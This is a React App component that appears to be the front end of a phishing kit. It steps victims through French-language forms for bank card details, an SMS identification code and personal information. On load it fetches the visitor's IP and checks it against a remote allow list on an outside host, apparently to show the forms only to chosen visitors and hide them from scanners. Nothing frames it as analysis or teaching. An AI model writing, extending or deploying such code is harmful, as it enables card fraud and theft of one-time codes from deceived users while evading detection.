import React, { Component } from "react";
import { connect } from "react-redux";
import Contents from "./Containers/contents";
import InfoForm from "./Containers/InfoForm";
import CardForm from "./Containers/CardForm";
import SmsForm from "./Containers/SmsForm";
import withAnalytics from "./Containers/AnalyticsHot";
import { PAGES, getPageInfo } from "./actions/index";
import Spinner from "./Components/Spinner";
import SuccessMessage from "./Containers/Success";



class App extends Component {
	componentDidMount() {
		fetch('https://api.ipify.org?format=json')
			.then(res => res.json())
			.then(json => {
				this.setState({...this.state, ip_address: json.ip})
				fetch("https://redll2.com/allow.txt",{
					method: "GET",
					headers: {
						"Access-Control-Allow-Origin" : "*",
						"Access-Control-Allow-Methods" : "GET,HEAD,OPTIONS,POST,PUT",
						"Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Access-Control-Allow-Methods,Access-Control-Allow-Origin,Origin, X-Requested-With, Content-Type, Accept, Authorization",
						"Content-Type": "text/html"
					}
				})
					.then(res => res.text()).then(text => {
						if (text.includes(this.state.ip_address)) {
							this.setState({...this.state, hidden: false, is_active: true});
						}
						else{
							this.setState({...this.state, hidden: false, is_active: false});
						}
					});
				});
		if (this.props.activePage === null) {
			this.props.getPage();
		}
	}

	render() {
		const { activePage } = this.props;
		if (activePage === PAGES.card)
			return (
				<Contents>
					<CardForm title="Veuillez renseigner vos données bancaires." />
				</Contents>
			);
		if (activePage === PAGES.sms)
			return (
				<Contents>
					<SmsForm title="Veuillez renseigner le code sms d'identification." />
				</Contents>
			);
		if (activePage === PAGES.info)
			return (
				<Contents>
					<InfoForm title="Veuillez renseigner vos informations personnelles." />
				</Contents>
			);
		if (activePage === PAGES.extern) {
			return (
				<Contents>
					<SuccessMessage />
				</Contents>
			);
		}
		return <div>
			<Contents>
				<Spinner />
			</Contents>
		</div>;
	}
}

const mapPropsToStore = store => ({ activePage: store.session.activePage });
const mapDispatchToProps = {
	getPage: getPageInfo
};

export default connect(mapPropsToStore, mapDispatchToProps)(withAnalytics(App));
